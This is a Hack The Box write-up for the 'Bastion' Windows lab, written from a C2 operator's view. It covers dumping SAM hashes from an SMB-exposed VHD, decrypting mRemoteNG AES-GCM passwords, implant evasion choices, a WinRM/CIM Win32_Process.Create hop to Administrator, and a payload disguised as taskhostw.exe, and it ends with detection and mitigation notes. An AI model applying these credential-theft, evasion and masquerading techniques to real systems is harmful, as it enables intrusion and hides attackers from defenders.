# Bastion — HTB Write-up (C2 operator)

**Author:** DonMorpheus (lab) + Ania  
**Machine:** Bastion (Easy, Windows)  
**Host:** `bastion.htb` (Windows Server 2016 Standard, 14393)  
**Scope:** HTB VPN / personal lab only  

> **No flags** in this document. Passwords shown only as algorithm / placeholder.

Operator goal: **user-context implant first**, then **credential reuse that does not look like inbound SSH**.

---

## TL;DR

| Phase | Vector |
|-------|--------|
| Recon | 22 OpenSSH-Win, 135 RPC, 139/445 SMB (guest), 5985 WinRM |
| Creds 1 | SMB **Backups** VHD → SAM/SYSTEM → `L4mpje` NTLM → rockyou |
| Foothold | C2 EXE as `L4mpje` (GUI subsystem, name-camo). **Medium IL**, `Users` only |
| Creds 2 | `%APPDATA%\mRemoteNG\confCons.xml` AES-GCM, master `mR3m`, AAD=salt |
| Admin hop | From the **user implant**: CIM/WinRM to `127.0.0.1` + `Win32_Process.Create` |
| Not used | Operator SSH to `:22`; `token make` + `proc create` (net-only); SCM as SYSTEM |

---

## 1. Recon

```bash
nmap -sC -sV --top-ports 1000 <TARGET_IP>
# 22 OpenSSH for_Windows_7.9
# 135 RPC, 139/445 SMB  — Server 2016 Standard 14393, WORKGROUP BASTION, guest
# 5985 WinRM HTTPAPI
```

```bash
echo '<TARGET_IP> bastion.htb' | sudo tee -a /etc/hosts
```

Do not treat OpenSSH as the intended C2 channel. It is a **loud inbound logon** (`sshd`, source = VPN). WinRM is already on the box for the later hop.

---

## 2. Backups VHD → SAM

Null SMB lists a non-default share **`Backups`**. A VHD of the system volume is there. Full download is several GB; 7-Zip over a CIFS mount is enough for `Windows/System32/config/{SAM,SYSTEM}`.

CIFS `vers=3.0` may return `STATUS_ACCESS_DENIED`. **`vers=2.1`** worked in this lab.

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
# L4mpje NTLM → john / rockyou
```

Local groups: **Administrators = only `BASTION\Administrator`**. `L4mpje` is **Users**. This is a real limited account, not a UAC-split admin token. There is **no linked High IL** to duplicate from this user.

---

## 3. C2 as L4mpje (Medium)

Land a user-context implant (EXE, GUI subsystem, no IAT — hashed resolve). On 14393, sleep-obfuscation / syscall / AMSI combos that pass modern Win10 **failed check-in**. Conservative pack (WaitForSingleObjectEx, Win32, no AMSI, `LdrLoadDll`) checked in.

Identity from Situational Awareness `whoami` BOF (no `cmd.exe`):

```text
BASTION\L4mpje
BUILTIN\Users
Mandatory Label\Medium Mandatory Level   S-1-16-8192
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
```

**Token steal does not get High from here.** MAC + no `SeDebug`. `token find` as this user is a dead end for SYSTEM/winlogon.

Native `dir` on this implant hung (`state=sent`). Listing: `shell dir /a <path>`.

---

## 4. Why `token make` is not a local admin spawn

GUI:

```text
token make BASTION Administrator <PASS> LOGON_BATCH
```

`LogonUserW` succeeds. Thread impersonates; `token getuid` reports `(Admin)`.

`proc create` / `shell` then calls **`CreateProcessWithLogonW(..., LOGON_NETCREDENTIALS_ONLY)`**. That is **`runas /netonly`**: local identity stays **L4mpje**. New table row, same IL. Lab result: `sihost.exe` as `L4mpje` Medium.

Impersonation ≠ new High process. Blue still sees a Medium child of the user implant.

---

## 5. mRemoteNG AES-GCM

`C:\Program Files (x86)\mRemoteNG` (1.76.x). Config:

`C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml`

```text
EncryptionEngine=AES  BlockCipherMode=GCM  KdfIterations=1000  ConfVersion=2.6
```

Blob layout after Base64 (64 bytes for a 16-char password):

| offset | len | field |
|--------|-----|--------|
| 0 | 16 | salt |
| 16 | 16 | nonce |
| 32 | 16 | ciphertext (GCM, no pad) |
| 48 | 16 | tag |

```text
key = PBKDF2-HMAC-SHA1(master="mR3m", salt, 1000, 32)
AES-256-GCM.decrypt(key, nonce, ct||tag, AAD=salt)
```

**AAD must be the salt.** Without it, the MAC fails. Helper: [`scripts/mremoteng_gcm.py`](scripts/mremoteng_gcm.py).

Node `DC` / Username `Administrator` decrypts to the local admin password (write-up PDFs sometimes drop a character — verify against GCM, not against memory).

Official GUI path (same crypto): import XML → External Tool `cmd /k echo password %password%`.

---

## 6. Password → admin implant **without operator SSH**

Goal: the **L4mpje implant** asks a **SYSTEM service already on the box** (WinRM) to spawn the payload as Administrator.

Does **not** work:

| Attempt | Result |
|---------|--------|
| `runas /user:Administrator payload` | password prompt; session 0; no stdin |
| `Start-Process -Credential` / `CreateProcessWithLogonW` from this session | pid appears, then dies |
| `Invoke-Command { Start-Process ... }` | pid under `wsmprovhost`; **killed when the remoting pipeline ends** |
| `schtasks /ru Administrator /rp … /rl highest` | Access denied as `L4mpje` |

Works:

```powershell
$sec  = ConvertTo-SecureString '<ADMIN_PASS>' -AsPlainText -Force
$cred = New-Object PSCredential('.\Administrator', $sec)
$s = New-CimSession -ComputerName 127.0.0.1 -Credential $cred -Authentication Negotiate
Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create `
  -Arguments @{ CommandLine = 'C:\Users\Public\<benign>.exe'; CurrentDirectory = 'C:\Users\Public' }
```

WMI provider (SYSTEM) creates the process. Parent is **not** `sshd` and **not** the L4mpje PID. Child survives after WinRM returns.

Lab: payload copied as `taskhostw.exe` under `C:\Users\Public` (both users can execute). Check-in as `BASTION\Administrator`.

Integrity of **that** logon: **Medium** (`S-1-16-8192`). WinRM = network logon, UAC-filtered. `SeDebug` / `SeImpersonate` / `SeBackup` Disabled. Session table may still show “elevated” because `Administrators` is present — **read the mandatory label**.

A High IL Administrator process in this lab came from an already-admin logon (e.g. WMIC `Win32_Process.Create` in that context), not from this CIM hop.

---

## 7. SYSTEM (deliberately not the path)

From High Administrator, `sc create` + `sc start` of the same EXE as `LocalSystem` yields **System IL** (`S-1-16-16384`) immediately. The binary is `WinMain`, not a service — SCM then **STOP**s it after check-in.

That is the easy button. Operator choice here: stop at Administrator via **credential + WMI**, keep SCM in reserve.

---

## What blue still sees

| Channel | Telemetry |
|---------|-----------|
| Operator SSH `:22` | `sshd` Accepted password, source = VPN. Do not. |
| CIM hop | WinRM 5985 localhost, 4688 `taskhostw.exe`, WMI create, NTLM as Administrator |
| Implant | GUI EXE, odd parent, hashed imports, callback to operator listener |
| mRemoteNG | file read of `confCons.xml` |

OPSEC win is **no inbound SSH**. It is not “no logs”.

---

## Mitigations

- Guest SMB + VHD of `C:` with SAM is a full credential dump. Restrict `Backups`.
- mRemoteNG: unique master password, or do not store admin secrets in a user profile.
- WinRM: constrain who can create processes; alert on `Win32_Process.Create` from non-admin users using admin creds to localhost.
- UAC: filtered WinRM tokens still read the admin profile; treat Medium Administrator as sensitive.
